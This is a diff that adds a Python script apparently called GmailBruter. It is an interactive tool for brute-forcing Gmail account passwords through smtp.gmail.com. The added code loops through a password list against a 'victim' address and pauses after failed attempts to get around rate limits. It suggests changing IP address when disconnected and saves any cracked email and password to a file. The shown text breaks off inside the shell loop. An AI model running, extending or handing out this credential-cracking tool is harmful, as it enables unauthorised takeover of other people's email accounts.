@@ -1,0 +1,85 @@
+import smtplib , os , sys , time
+
+Count = 0
+_Count = 0
+
+def Banner():
+        Ban = "\n\t\t\t[>] SimpleGMailBruter [<]\n"; print(Ban)
+
+def StartBruteAccount(Passlist,account,SMTPServer,Count,_Count,Time):
+        with open('{0}'.format(Passlist),'r') as PasswordsFile:
+                for Password in PasswordsFile:
+                        Password = Password.rstrip("\n")
+                        try:
+                                SMTPServer.login(account,Password)
+                                print("[+] Valid Password Has Been Found: {0}, For: {1}".format(Password,account))
+
+                                # Create Data File!
+                                with open('credits.txt' , 'a') as DataFile:
+                                        DataFile.write("\n--------------------------------------->"); DataFile.write("[+] Email: {0}\n".format(account)); DataFile.write("[+] Password: {0}\n".format(Password)); DataFile.write("--------------------------------------->");DataFile.close()
+                                exit()
+                        except smtplib.SMTPAuthenticationError:
+                                Count += 1; _Count += 1
+                                if Count == 20:
+                                        print("\n[!] Sleeping For {0} Seconds.".format(str(Time))); time.sleep(int(Time)); Count = 0
+                                        SMTPServer.close()
+
+                                        SMTPServer = StartSMTPServiceForGmail()
+                                else:
+                                        print("\rBad Password: {0}".format(Password + "   ") , end="")
+                                        sys.stdout.flush()
+                        except Exception as e:
+                                if "please run connect() first" in str(e):
+                                        SMTPServer.close()
+                                        print("\nThe SMTP Server Disconnected. Please Run The Tool Again After Changing Your IP Address Or After Waiting Sometime"); exit()
+                                else:
+                                        print("Error: " + str(e))
+
+def StartSMTPServiceForGmail():
+        SMTPServer = smtplib.SMTP('smtp.gmail.com', 587)
+        SMTPServer.ehlo()
+        SMTPServer.starttls()
+        return SMTPServer
+
+def HelpGuide():
+        print("\nHelp Guide For GmailBruterV2.")
+        print("Commands For Shell:")
+        print("\thelp\t\t--\tTo Show This Messages")
+        print("\tset target\t--\tTo Set The Victim Email Address")
+        print("\tset time\t--\tTo Set Time Between Every 10 Faild Passwords")
+        print("\tset list\t--\tTo Set PassList Name ")
+        print("\tshow target\t--\tTo Show You Current Target ")
+        print("\tshow time\t--\tTo Show You Current Time ")
+        print("\tshow list\t--\tTo Show You Current List ")
+        print("\tload\t\t--\tLoad Local Config For Settings")
+        print("\tstart\t\t--\tTo Start Brute Force Attack\n")
+        print("\texit\t\t--\tClose The Shell")
+
+def ContactMe():
+        Gmail =  "mdaif1332@gmail.com" # Don't perform the brute-force attacks on my email.
+
+def StartShell():
+        # store how many times the user pressed Ctrl + C
+        AbortCount = 0
+        Commands = []
+        Account = ''
+        Time = ''
+        PassList = ''
+        with open(os.path.join("data" , "Commands") ,'r') as CommandsFile:
+                for Command in CommandsFile:
+                        Command = Command.rstrip("\n")
+                        Commands.append(Command)
+        while True:
+                # init variable to store user input
+                ShellResponse = ''
+                try:
+                        # get input from user
+                        ShellResponse = input("root@GmailBruter: ")
+
+                # handle Ctrl + C
+                except KeyboardInterrupt:
+                        # increment AbortCount
+                        AbortCount += 1
+                        # print \n to print the new shell line on the next line
+                        print()
+                        # if the user pressed Ctrl + C two times
